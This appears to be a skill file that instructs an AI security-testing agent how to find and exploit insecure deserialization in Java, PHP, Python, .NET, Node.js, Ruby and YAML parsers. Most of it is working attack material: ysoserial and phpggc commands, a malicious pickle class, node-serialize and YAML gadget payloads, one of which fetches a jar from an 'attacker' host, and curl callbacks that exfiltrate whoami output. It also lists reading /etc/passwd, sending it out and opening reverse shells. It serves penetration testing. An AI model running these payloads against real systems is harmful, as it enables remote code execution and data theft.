---
name: deserialization-testing
description: Insecure deserialization detection and gadget chain exploitation
origin: AI Threat Hunting
---

# Insecure Deserialization Testing

> **`aith assess kali` audit flags:** use `--technique RCE` (insecure deserialization is canonically an RCE primitive via gadget chains). Switch to `INFO-DISCLOSURE` for pure oracle or leak-only exploitation.

## When to Activate

- Binary or encoded blobs in cookies, parameters, or hidden fields
- Known serialization signatures in traffic
- Application uses Java (RMI, JMX), PHP, Python (pickle), or .NET

## Tools

- `aith assess kali exec -- curl ...` (deliver serialized payloads to target endpoints — all target-facing requests must go through the kali exec wrapper; use `--technique RCE --probe-kind payload --phase consume-test --timeout 30` for gadget chain delivery, `--probe-kind exploit` once execution is confirmed)
- ysoserial (Java gadget chains — run host-side to generate payloads: `java -jar ysoserial.jar ...`)
- phpggc (PHP gadget chains — run host-side to generate payloads)
- Burp Suite (Java Deserialization Scanner extension — use to identify candidate parameters, then deliver confirmed payloads via kali exec)
- ppickle exploit generator (Python — host-side payload generation)
- `aith oob mint` / `aith oob poll` (blind gadget-chain confirmation — mint a callback URL, use it as the gadget command, poll for the correlated hit; see "Blind Confirmation via OOB" below — replaces reading the listener log by hand)
- `aith assess classify-payload <blob> --mutations` (type the serialized blob / tampered field and generate type-confusion + escalation variants — see "Type the Serialized Value" below)
- Custom scripts for .NET formatters (run via `aith assess kali exec --technique RCE ... -- python3 ...` if target-facing)

## Methodology

### 1. Identify Serialized Data

- [ ] Java: magic bytes `ac ed 00 05` (hex) or `rO0AB` (base64)
- [ ] PHP: `O:4:"User":2:{s:4:"name";...}` or `a:2:{...}`
- [ ] Python pickle: `\x80\x04\x95` header or `cos\nsystem\n` patterns
- [ ] .NET: `AAEAAAD/////` (base64 BinaryFormatter), XML with `<a1:` namespace
- [ ] Check cookies, ViewState, session storage, message queues, API params
- [ ] Check `Content-Type`: `application/x-java-serialized-object`, `application/x-php-serialized`

**Type the blob before tampering.** Run the opaque cookie/parameter value through the classifier to confirm its encoding and get type-confusion variants deterministically:

```bash
aith assess classify-payload "rO0ABXNy..." --mutations    # type: base64 (Java) → format: quoted, null, truncated, "=="-padded
aith assess classify-payload "admin" --mutations          # the tampered role field (§10) → escalation: root, ADMIN, 0, 1, true
```

Consume by intent bucket:
- **`format`** on a `base64`/`hex` blob → `null`, `""`, `[]`, the `==`-repadded and truncated forms — quick probes for "what does the deserializer do with a malformed/absent blob?" (a stack trace here confirms the sink and often leaks the formatter/library).
- **`escalation`** on the *decoded* tampering target (a `role`/`isAdmin` string field per §10 Data Tampering) → `admin`, `root`, `ADMIN`, `true`, `0`, `1` — drop these into the field before re-serializing for the non-RCE privilege-escalation path.

The gadget chains themselves are byte-structured payloads from ysoserial/phpggc, not value-typed — keep generating those with the tools above. The classifier helps with the *envelope* (encoding) and the *tampered scalar fields*, not the chain bytes.

### 2. Java Deserialization

- [ ] Generate payloads with ysoserial:
      `java -jar ysoserial.jar CommonsCollections1 "id" | base64`
- [ ] Test common gadget chains: CommonsCollections1-7, Spring, Groovy, Hibernate
- [ ] Identify libraries in classpath from error messages or probing
- [ ] Test via cookies, POST body, RMI endpoints, JMX, T3 (WebLogic)
- [ ] Blind (the usual case): generate the chain with a minted OOB callback as its command and poll for the hit — see "Blind Confirmation via OOB" in §9

### 3. PHP Deserialization

- [ ] Modify serialized object: change property values
- [ ] Type juggling: change types in serialized data
- [ ] Generate payloads with phpggc:
      `phpggc Laravel/RCE1 system id`
- [ ] Target `__wakeup()`, `__destruct()`, `__toString()` magic methods
- [ ] Phar deserialization: upload `.phar` file, trigger via `phar://` wrapper

### 4. Python Pickle

- [ ] Craft malicious pickle:
      ```python
      import pickle, os
      class Exploit:
          def __reduce__(self):
              return (os.system, ('id',))
      pickle.dumps(Exploit())
      ```
- [ ] Test in cookies, session data, API payloads, cached objects
- [ ] Blind (the usual case): return a minted OOB callback fetch from `__reduce__` and poll for the hit — see "Blind Confirmation via OOB" in §9

### 5. .NET Deserialization

- [ ] Identify formatter: BinaryFormatter, DataContractSerializer, Json.NET
- [ ] ViewState deserialization (if MAC validation disabled)
- [ ] Generate payloads with ysoserial.net:
      `ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id"`
- [ ] Test TypeNameHandling in Json.NET: `"$type":` property injection

### 6. Node.js

- [ ] Identify `node-serialize`, `serialize-javascript`, or `funcster` usage
- [ ] Test `{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}` for node-serialize
- [ ] Check if `JSON.parse` input flows into `eval`, `Function()`, or `vm.runInContext`

### 7. Ruby

- [ ] Identify `Marshal.load`, `YAML.load` (without `safe_load`), or `Oj.load` usage
- [ ] Markers: `\x04\x08` (Marshal magic bytes)
- [ ] Generate payloads via universal-rce-ruby or craft `Marshal.dump` with ERB template gadgets
- [ ] Check Rails `cookies.signed` / `cookies.encrypted` for Marshal-based session stores

### 8. YAML Deserialization

- [ ] Python PyYAML `yaml.load()` without `Loader=SafeLoader`:
      `!!python/object/apply:os.system ['id']`
- [ ] Ruby Psych `YAML.load()`:
      `!!ruby/object:Gem::Installer\ni: x`
- [ ] Java SnakeYAML:
      `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/exploit.jar"]]]]`
- [ ] .NET YamlDotNet: generally safe, but check custom type converters

### 9. Impact Validation

- [ ] Confirm code execution with `id`, `whoami`, or an OOB callback (see "Blind Confirmation via OOB" below — the default channel when output is not reflected)
- [ ] Read sensitive files
- [ ] Establish reverse shell if in scope
- [ ] Check if deserialized data affects application logic (role, permissions)

#### Blind Confirmation via OOB

Deserialization RCE is almost always blind — the gadget executes but stdout never returns to you. Mint a nonce-tagged callback and use it AS the gadget command, then poll for the correlated hit instead of grepping the listener log:

```bash
aith oob status --json
aith oob mint --technique deserialization --target-url "https://target/api" --param session --probe-kind dns
# -> http  http://<prefix>-<token>.researcher.example/
#    dns   <prefix>-<token>.researcher.example
```

Feed the minted host as the command when generating the chain, then deliver via the kali exec wrapper:

```bash
# Java — ysoserial command = the callback fetch
java -jar ysoserial.jar CommonsCollections1 'curl http://<prefix>-<token>.researcher.example/' | base64
# Python pickle — __reduce__ returns the callback
#   return (os.system, ('nslookup <prefix>-<token>.researcher.example',))
# PHP phpggc
phpggc Laravel/RCE1 system 'curl http://<prefix>-<token>.researcher.example/'
```

Correlate:

```bash
aith oob poll --client <name> --json
```

A non-empty `matched` array for your nonce confirms blind code execution — each match ties the callback (`protocol`, `remote_address`) to the recorded probe (`technique`, `target_url`), proving *which* gadget chain fired. Exfil one field by prepending it to the host (`curl http://$(whoami).<prefix>-<token>.researcher.example/`) — the value lands as the left label of the matched callback. DNS-only callbacks (use `nslookup`/`dig` gadgets, `--probe-kind dns`) still confirm execution where egress is firewalled to DNS. Empty `matched` after the payload lands → the chain did not execute (wrong gadget/library); rotate chains and record a runtime issue.

### 10. Data Tampering (Non-RCE)

- [ ] Modify user role/privilege in serialized session
- [ ] Change object references to access other users' data
- [ ] Alter numeric values (price, quantity, balance)

## What to Record

- Endpoint and parameter carrying serialized data
- Serialization format and language
- Gadget chain used (if RCE)
- Proof of execution (command output or callback) — confirming the gadget chain payload was accepted is not enough; you must show the **attacker outcome** (e.g., the CommonsCollections1 payload executed `whoami` and `aith oob poll --client <name>` returned a matched callback whose left label was `root` — proving the chain fired as root; the pickle payload read `/etc/passwd` and its contents were exfiltrated via HTTP callback; the tampered session role field of `admin` was accepted and granted access to the admin dashboard)
- Libraries enabling the chain
- Severity: Critical (RCE) or High (data tampering)
- Remediation: avoid native deserialization, use allowlists, sign serialized data

### 11. Framework-Specific Deserialization Checks

- [ ] **Django**: Check for `pickle` in cache backend or session serializer
- [ ] **Rails**: Check `Marshal.load` usage, test `cookies_serializer` config (should be `:json`)
- [ ] **Express**: Check for `cookie-session` with unsigned cookies
- [ ] **Spring**: Check for `DefaultSerializer` in session persistence, test RememberMe tokens
- [ ] **Laravel**: Check encrypted cookie handling, `APP_KEY` rotation issues

## Extended Resources

- `agent/references/payloads/deserialization-payloads.md` — Java (ysoserial), PHP, Python (pickle), Node.js, .NET
